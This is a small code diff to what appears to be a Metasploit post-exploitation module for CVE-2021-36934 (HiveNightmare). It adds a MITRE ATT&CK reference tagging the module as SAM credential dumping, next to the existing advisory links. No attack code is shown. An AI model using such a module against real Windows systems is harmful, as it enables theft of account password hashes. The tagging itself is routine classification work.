@@ -27,7 +27,8 @@ class MetasploitModule < Msf::Post
           ['CVE', '2021-36934'],
           ['URL', 'https://github.com/GossiTheDog/HiveNightmare'],
           ['URL', 'https://isc.sans.edu/diary/Summer+of+SAM+-+incorrect+permissions+on+Windows+1011+hives/27652'],
-          ['URL', 'https://github.com/romarroca/SeriousSam']
+          ['URL', 'https://github.com/romarroca/SeriousSam'],
+          ['ATT&CK', Mitre::Attack::Technique::T1003_002_SECURITY_ACCOUNT_MANAGER]
         ],
         'DisclosureDate' => '2021-07-20',
         'Platform' => [ 'win' ],
